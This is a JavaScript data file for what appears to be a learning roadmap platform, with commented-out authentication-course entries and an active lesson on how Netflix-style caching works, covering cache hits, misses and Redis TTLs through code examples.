  //   description: "This is what companies expect. How to scale authentication services using stateless tokens and distributed sessions.",
  //   topics: [
  //     "Stateless auth using JWT",
  //     "Refresh token rotation",
  //     "Token blacklisting (logout handling)",
  //     "Distributed sessions (Redis)",
  //     "API Gateway handling auth",
  //     "Microservices auth strategy"
  //   ],
  //   faqs: [
  //     {
  //       question: "Is Frontend Development really coding?",
  //       answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
  //     },
  //     { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
  //     { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
  //     { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
  //     { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
  //     { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
  //   ]
  // },
  // {
  //   id: 7,
  //   title: "Real-world System Design Topics",
  //   description: "Designing enterprise-grade authentication systems capable of handling millions of concurrent users.",
  //   topics: [
  //     "Design login system for millions of users",
  //     "Concurrent sessions & Device-based login",
  //     "Suspicious activity detection",
  //     "Rate limiting & abuse prevention",
  //     "Logging & monitoring auth events"
  //   ],
  //   faqs: [
  //     {
  //       question: "Is Frontend Development really coding?",
  //       answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
  //     },
  //     { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
  //     { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
  //     { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
  //     { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
  //     { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
  //   ]
  // },
  // {
  //   id: 8,
  //   title: "Bonus",
  //   description: "Stand out level. Advanced paradigms like SSO, Zero Trust, and passwordless flows.",
  //   topics: [
  //     "SSO (Single Sign-On)",
  //     "Zero Trust Architecture",
  //     "WebAuthn / Passwordless login",
  //     "Biometric authentication"
  //   ],
  //   faqs: [
  //     {
  //       question: "Is Frontend Development really coding?",
  //       answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
  //     },
  //     { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
  //     { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
  //     { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
  //     { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
  //   ]
  // }
  ]
  },
  {
  id: "netflix-caching",
  title: "How caching works in Netflix",
  nodes: [
    {
      id: 1,
      title: "Caching Fundamentals",
      topics: [
        "What is Caching",
        "Cache Hit & Cache Miss",
        "Cache Hit Ratio",
        "Why Caching Matters",
        "Where Cache Lives (Browser, Server, DB, CDN)"
      ],
      topicDetails: {
    "What is Caching": [
      {
        type: "paragraph",
        text: "You open Netflix. Click on Stranger Things. The thumbnail loads instantly. The description appears instantly. The 'Continue Watching' badge is already there. All of this in under 100ms."
      },
      {
        type: "curious-callout",
        text: "❓ Netflix has 280 million subscribers. If every click hit the database — how is any of this instant?"
      },
      {
        type: "heading",
        text: "The Problem That Led to Caching"
      },
      {
        type: "error-callout",
        title: "Imagine Netflix had no caching — every request hits the database directly:",
        list: [
          "280 million users open Netflix at the same time",
          "Every homepage load = 50+ database queries (thumbnails, titles, ratings, continue-watching...)",
          "Database gets 14 billion queries per second",
          "Database crashes. Netflix goes down.",
          "Even if it survived — each query takes 50–200ms. Nothing feels instant."
        ],
        footer: "👉 Databases are powerful but slow. They're not built for 280 million simultaneous reads."
      },
      {
        type: "heading",
        text: "What is Caching?"
      },
      {
        type: "paragraph",
        text: "Caching is basically storing data temporarily so it can be returned faster next time."
      },
      {
        type: "heading",
        text: "How Caching Works in Netflix — a Simple Example"
      },
      {
        type: "step",
        title: "Step 1 — First user requests the Top 10 list",
        desc: "Netflix's server needs the Top 10 trending shows for India. It queries the database — joins multiple tables, runs aggregations, fetches thumbnails. Takes 200ms."
      },
      {
        type: "code",
        code: "// Without cache — database query:\nconst top10 = await db.query(`\n  SELECT shows.id, shows.title, shows.thumbnail, COUNT(views.id) as view_count\n  FROM shows\n  JOIN views ON views.show_id = shows.id\n  WHERE views.region = 'IN'\n  GROUP BY shows.id\n  ORDER BY view_count DESC\n  LIMIT 10\n`);\n// ⏱️ Takes ~200ms. Hits the DB every time."
      },
      {
        type: "step",
        title: "Step 2 — Server stores the result in cache",
        desc: "After fetching from the database, Netflix saves that result into Redis (a fast in-memory cache) with a key like 'top10:IN'. This takes under 1ms to write."
      },
      {
        type: "code",
        code: "// Store result in Redis for 10 minutes:\nawait redis.set('top10:IN', JSON.stringify(top10), 'EX', 600);\n// 'EX', 600 → expires automatically after 600 seconds"
      },
      {
        type: "step",
        title: "Step 3 — Every other user gets it from cache",
        desc: "The next 10 million users who open Netflix and ask for the Top 10 list — the server checks Redis first. Finds it. Returns it instantly. The database is never touched again for those 10 minutes."
      },
      {
        type: "code",
        code: "// Every subsequent request:\nconst cached = await redis.get('top10:IN');\n\nif (cached) {\n  return JSON.parse(cached); // ⚡ Returns in ~1ms — from memory\n}\n\n// Only reaches DB if cache is empty:\nconst top10 = await db.query(...);"
      },
      {
        type: "success-callout",
        text: "One database query. 10 million users served. That's caching — do the expensive work once, serve the result to everyone fast."
      },
      {
        type: "heading",
        text: "What Exactly Gets Cached?"
      },
      {
        type: "paragraph",
        text: "Not everything is worth caching — only things that are expensive to compute and requested frequently. Netflix caches things like:"
      },
      {
        type: "table",
        headers: ["What", "Cache Key Example", "Why Cache It"],
        rows: [
          ["Top 10 trending shows", "top10:IN", "Same for all Indian users, changes rarely"],
          ["Show metadata (title, cast, rating)", "show:tt0903747", "Fetched millions of times, almost never changes"],
          ["User's continue-watching list", "user:42:continue", "Fetched on every homepage load"],
          ["Search results", "search:breaking+bad", "Same query = same results, expensive to compute"],
          ["Thumbnail images", "CDN cache", "Static files, no reason to re-fetch from origin"]
        ]
      },
      {
        type: "warning-callout",
        text: "⚠️ Cache stores a snapshot of data. If the database changes — the cache might return outdated info. Managing when to update the cache is one of the hardest problems in engineering. We'll get to that."
      },
      {
        type: "curious-callout",
        text: "❓ But what actually happens when a user's request finds data in the cache vs doesn't find it? And how does Netflix even know whether to check the cache first?"
      }
    ],

    "Cache Hit & Cache Miss": [
      {
        type: "paragraph",
        text: "Every time Netflix's server receives a request, it checks the cache first. What happens next depends entirely on whether the data is there or not. These two outcomes — hit and miss — drive every caching decision Netflix makes."
      },
      {
        type: "heading",
        text: "Cache Hit"
      },
      {
        type: "paragraph",
        text: "A cache hit happens when the server checks the cache and finds exactly what it was looking for. No database. No computation. Just an instant return from memory."
      },
      {
        type: "step",
        title: "Scenario — Priya opens Netflix",
        desc: "Priya is in Mumbai. She opens the Netflix homepage. The server checks Redis for 'top10:IN'."
      },
      {
        type: "code",
        code: "// Server receives: GET /api/homepage\n// Step 1 — Check cache first:\nconst cached = await redis.get('top10:IN');\n\n// Step 2 — Cache has it ✅ (CACHE HIT)\nif (cached) {\n  console.log('Cache HIT — returning from Redis');\n  return res.json(JSON.parse(cached));\n  // ⚡ Done in ~1ms. Database never involved.\n}"
      },
      {
        type: "success-callout",
        text: "Cache Hit = The data was in cache. Returned in ~1ms. Database load: zero. This is the best case — and what Netflix optimizes every layer of its system to achieve."
      },
      {
        type: "heading",
        text: "Cache Miss"
      },
      {
        type: "paragraph",
        text: "A cache miss happens when the server checks the cache and finds nothing — either because the data was never cached, or it expired. Now the server has to do the expensive thing: go to the database."
      },
      {
        type: "step",
        title: "Scenario — Cache expired, Priya opens Netflix",
        desc: "The 'top10:IN' cache entry expired 5 seconds ago. Priya is the first person to open Netflix since. The server checks Redis — nothing there."
      },
      {
        type: "code",
        code: "// Server receives: GET /api/homepage\n// Step 1 — Check cache:\nconst cached = await redis.get('top10:IN');\n\n// Step 2 — Nothing found ❌ (CACHE MISS)\nif (!cached) {\n  console.log('Cache MISS — querying database');\n\n  // Step 3 — Go to database (slow path):\n  const top10 = await db.query(`\n    SELECT shows.id, shows.title, COUNT(views.id) as view_count\n    FROM shows JOIN views ON views.show_id = shows.id\n    WHERE views.region = 'IN'\n    GROUP BY shows.id ORDER BY view_count DESC LIMIT 10\n  `); // ⏱️ ~200ms\n\n  // Step 4 — Populate the cache for next time:\n  await redis.set('top10:IN', JSON.stringify(top10), 'EX', 600);\n\n  return res.json(top10);\n}"
      },
      {
        type: "insight-callout",
        text: "💡 After a cache miss, the server always writes the fresh result back into the cache. So the very next person to ask gets a cache hit — even if Ram's request was slow."
      },
      {
        type: "heading",
        text: "Hit vs Miss — Side by Side"
      },
      {
        type: "table",
        headers: ["", "Cache Hit", "Cache Miss"],
        rows: [
          ["Data found in cache?", "✅ Yes", "❌ No"],
          ["Database queried?", "No", "Yes"],
          ["Response time", "~1ms", "~200ms"],
          ["What happens next", "Returns cached result instantly", "Fetches from DB, writes to cache, returns result"],
          ["Cost", "Extremely cheap", "Expensive — compute + DB load"]
        ]
      },
      {
        type: "heading",
        text: "The Three Reasons a Cache Miss Happens"
      },
      {
        type: "step",
        title: "1 — Cold Miss (first time ever)",
        desc: "The data was never cached before. A brand new show just dropped on Netflix — no one has requested it yet. Cache is empty. First request always misses."
      },
      {
        type: "code",
        code: "// New show added to Netflix:\n// Cache key 'show:squidgame2' doesn't exist yet.\n// First user to open that show page → CACHE MISS → DB hit\n// Cache populated → every user after → CACHE HIT"
      },
      {
        type: "step",
        title: "2 — Expiry Miss (TTL expired)",
        desc: "The data was cached, but it expired. Netflix sets a TTL (Time to Live) on every cache entry. When it expires, the next request misses and refreshes the cache. "
      },
      {
        type: "code",
        code: "// Cache was set with 10 min TTL:\nawait redis.set('top10:IN', data, 'EX', 600);\n\n// After 600 seconds — Redis auto-deletes it.\n// Next request → CACHE MISS → fresh DB fetch → cache repopulated"
      },
      {
        type: "step",
        title: "3 — Eviction Miss (cache ran out of space)",
        desc: "Redis has a memory limit. When it's full and a new entry needs to be stored, Redis evicts (removes) old or less-used entries to make room. If the evicted data gets requested again — it's a miss."
      },
      {
        type: "code",
        code: "// Redis is configured with a max memory limit:\n// maxmemory 4gb\n// maxmemory-policy allkeys-lru  ← evict least recently used keys first\n\n// When memory is full:\n// Redis removes the least recently used entry automatically\n// If that entry is requested → CACHE MISS"
      },
      {
        type: "heading",
        text: "Why Cache Misses Are Expensive — The Real Cost"
      },
      {
        type: "error-callout",
        title: "If Netflix's cache suddenly went down and every request became a miss:",
        list: [
          "280 million simultaneous users → billions of DB queries per second",
          "Database server CPU hits 100% → queries queue up → response time climbs to seconds",
          "Users see spinning loaders → frustration → they leave",
        ],
        footer: "👉 This is why Netflix runs multiple layers of caching. A miss at Layer 1 hits Layer 2. Only if all layers miss does the database get touched."
      },
      {
        type: "curious-callout",
        text: "❓ If cache hits are fast and misses are slow — how does Netflix measure whether its caching is actually working? Is there a number that tells them 'the cache is healthy'?"
      }
    ]
  }
      
    },
    {
      id: 2,
      title: "Cache Reading Strategies",
      topics: [
        "Cache-Aside (Lazy Loading)",
        "Read-Through Cache"
      ]
    },
    {
      id: 3,
      title: "Cache Writing Strategies",
      topics: [
        "Write-Through Cache",
        "Write-Behind (Write-Back) Cache",
        "Write-Around Cache"
      ]
    },
    {
      id: 4,
      title: "Cache Invalidation",
      topics: [
        "TTL (Time to Live)",
        "LRU (Least Recently Used)",
        "LFU (Least Frequently Used)",
        "FIFO (First In First Out)",
        "Manual & Event-Driven Invalidation"
      ]
    },
    {
      id: 5,
      title: "Redis as a Cache",
      topics: [
        "What is Redis & How it Works",
        "Redis vs Memcached — When to Use Which",
        "Redis TTL & Key Expiry",
        "Redis Eviction Policies",
        "Redis Persistence (RDB vs AOF)",
        "Redis Memory Optimization",
        "Redis Pipelining & Batching",
        "Redis Transactions (MULTI/EXEC)",
        "Redis Keyspace Notifications"
      ]
    },
    {
      id: 6,
      title: "Redis Data Structures for Caching",
      topics: [
        "Strings — Simple Key Value Cache",
        "Hashes — Cache Objects & User Sessions",
        "Lists — Cache Feeds & Queues",
        "Sets — Cache Unique Items",
        "Sorted Sets — Cache Leaderboards & Rankings",
        "Bitmaps — Cache User Activity Flags",
        "HyperLogLog — Cache Unique Visitor Counts"
      ]
    },
    {
      id: 7,
      title: "HTTP & CDN Caching",
      topics: [
        "How CDN Caching Works",
        "Cache-Control Headers",
        "ETag & Conditional Requests",
        "Stale-While-Revalidate",
        "Browser Cache vs CDN Cache"
      ]
    },
    {
      id: 8,
      title: "Cache Problems & Solutions",
      topics: [
        "Cache Stampede (Thundering Herd)",
        "Cache Penetration",
        "Cache Avalanche",
        "Hotspot Key Problem",
        "Negative Caching",
        "Cache Poisoning",
        "Mutex Lock & Probabilistic Early Expiry"
      ]
    },
    {
      id: 9,
      title: "Distributed Caching",
      topics: [
        "What is Distributed Caching",
        "Consistent Hashing",
        "Cache Replication",
        "Cache Partitioning (Sharding)",
        "Redis Cluster",
        "Leader-Follower Redis Setup",
        "CAP Theorem Applied to Cache",
        "Replication Lag & Stale Reads"
      ]
    },
    {
      id: 10,
      title: "Advanced Cache Patterns",
      topics: [
        "Multi-Layer Caching (L1, L2, L3)",
        "Cache Warming & Pre-population",
        "Session Caching",
        "Rate Limiting with Redis",
        "Idempotency Keys with Cache",
        "Geo-distributed Cache (Multi-region)",
        "Write-Heavy vs Read-Heavy Cache Design"
      ]
    },
    {
      id: 11,
      title: "System Design with Cache",
      topics: [
        "Netflix Open Connect (ISP-level CDN)",
        "Design Twitter Feed with Cache",
        "Design YouTube View Counter with Cache",
        "Design Rate Limiter using Redis",
        "Design Autocomplete using Redis",
        "Designing Cache for 10M Users",
        "Cache Consistency vs Availability",
        "Cache Monitoring & Eviction Metrics",
        "When NOT to Use Cache"
      ]
    }
  ]
}
];
